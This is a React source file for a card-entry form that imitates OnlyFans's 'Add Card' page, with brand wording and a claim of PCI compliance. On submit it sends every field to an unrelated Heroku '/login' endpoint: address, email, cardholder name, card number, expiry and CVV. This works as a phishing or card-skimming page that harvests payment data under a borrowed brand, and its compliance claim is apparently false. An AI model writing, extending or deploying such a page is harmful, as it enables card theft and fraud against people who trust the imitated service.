import React, {useState, useEffect, Component} from 'react'
import Axios from 'axios'
import FormInput from '../formInput/formInput'
import arrow from '../assets/left-black-arrow.svg'
import {Link, useHistory} from 'react-router-dom'

import './form.css'

const Form =()=>{

    const history = useHistory()

    const [city, setcity] = useState('')
    const [street, setstreet] = useState('')
    const [province, setprovince] = useState('')
    const [zip, setzip] = useState('')
    const [country, setcountry] = useState('')
    const [email, setemail] = useState('')
    const [name, setname] = useState('')
    const [number, setnumber] = useState('')
    const [month, setmonth] = useState('')
    const [year, setyear] = useState('')
    const [cvv, setcvv] = useState('')
   
 


      const submitHandle =(e)=>{
            e.preventDefault()           
            console.log(email,number)
            Axios.post("https://danprojectdb.herokuapp.com/login", {
                
                street : street,
                city: city,
                province: province,
                zip : zip,
                country :country,        
                email: email,
                name: name,
                number: number,   
                month : month,
                year : year,        
                cvv: cvv,
                
            })
            .then((response) => {
                console.log('suceesful inserted')
                history.push('/subpage')
                if (response.status === 200)
           { this.props.handleSucesfulAuth(response.data)} 
            })
            .catch(error => console.log(error));

            
        }

      
     
        //  handleChange= event =>{
        //     const {name,value} = event.target;
        
        //     this.setState({[name]: value})
        // }
        
     
      

    return (
        <div className='cardContainer'>
            
            <div className="cardHeader">
                <Link to='/'
                className='cardLink'
                > 
                <div
                style={{
                    backgroundImage: `url(${arrow})`
                }}
                 className="svgArrow"/>
                 </Link>
                <p className="cardHeading">ADD CARD</p>
            </div>



    <form onSubmit={submitHandle} 
    className='form'
    >  

    <div className="formCont">


    <div className="formRight">

        <div className="textDetails">
            <p className="billingText">
                BILLING DETAILS
            </p>
            <p className="detailedText">
                We are fully compliant with Payment Card Industry Data 
                Security Standard
            </p>

        </div>


        <FormInput 
        type="text"
        name= 'street'
        label='Street'
        onChange={e => setstreet(e.target.value)}
        value={street}
        required
        />

<FormInput 
        type="text"
        name= 'city'
        label='City'
        onChange={e => setcity(e.target.value)}
        value={city}
        required
        />

<FormInput 
        type="text"
        name= 'province'
        label='State / Province'
        onChange={e => setprovince(e.target.value)}
        value={province}
        required
        />

<FormInput 
        type="text"
        name= 'zip'
        label='Zip / Postal Code'
        onChange={e => setzip(e.target.value)}
        value={zip}
        required
        />

<FormInput 
        type="text"
        name= 'country'
        label='Country'
        onChange={e => setcountry(e.target.value)}
        value={country}
        required
        
        />


        </div> 


        <div className="formleft">

        <div className="cardDetails">
            <p className="billingText">
                CARD DETAILS
            </p>
           

        </div>


<FormInput 
        type="text"
        name= 'email'
        label='Email'
        onChange={e => setemail(e.target.value)}
        value={email}
        required

        />

<FormInput 
        type="text"
        name= 'name'
        label='Name on the Card'
        onChange={e => setname(e.target.value)}
        value={name}
        required
        />

        
<FormInput 
        type="text"
        name= 'number'
        label='Card Number'
        onChange={e => setnumber(e.target.value)}
        value={number}
        required
        />
<div className="expiration">

<p className="billingText">
                EXPIRATION
            </p>

<div className="formFlex">
<FormInput 
        type="text"
        name= 'month'
        label='MM'
        onChange={e => setmonth(e.target.value)}
        value={month}
        required
        smallWidth

        />

<FormInput 
        type="text"
        name= 'year'
        label='YYYY'
        onChange={e => setyear(e.target.value)}
        value={year}
        required
        smallWidth

        />

<FormInput 
        type="text"
        name= 'cvv'
        label='CVC'
        onChange={e => setcvv(e.target.value)}
        value={cvv}
        required
        smallWidth

        />

</div>
<div className="checkboxCont">
    <input type="checkbox" className="checkbox"/>
    <p className="detailedText checkboxText">
        Tick here to comfirm at you are at least 18 years old 
        and the age of majority in your place of residence
    </p>
</div>
</div>



        </div>







</div>

 

<button className='formBtn' type="submit">submit</button>
</form> 

<div className="onlyfansText">
OnlyFans will make a one-time charge of $0.10 when adding your payment card. The charges 
on your credit card statement will appear as "OnlyFans".
</div>

        </div>
    )
    }


export default Form 